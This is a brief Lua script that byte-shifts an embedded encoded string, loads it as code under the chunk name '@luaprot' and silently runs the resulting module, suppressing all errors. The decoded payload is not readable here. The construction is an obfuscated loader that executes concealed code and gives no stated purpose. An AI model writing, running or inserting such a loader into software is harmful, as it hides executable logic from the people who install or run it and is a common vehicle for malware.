local K = "xK9m2pL7qR"

local function D(s)
local o = {}
for i = 1, #s do
o[#o + 1] = string.char((string.byte(s, i) + #K) & 0xFF)
end
return table.concat(o)
end

local B = D("kR\092:mRW@V\131C}naP\129mwC:Vw?vnMCrmQu\128ntW\128lQCrdQ`\131m\131Cxdb[\128Y^O\132W\132W\130XNu:W\132c>W\132m\131XtO?WNuG")

local function L()
local fn = loadstring(B, "@luaprot")
if not fn then
return
end

local ok, mod = pcall(fn, 0)
if ok and type(mod) == "table" then
pcall(function()
if mod.run then
mod.run()
end
end)
end
end

L()
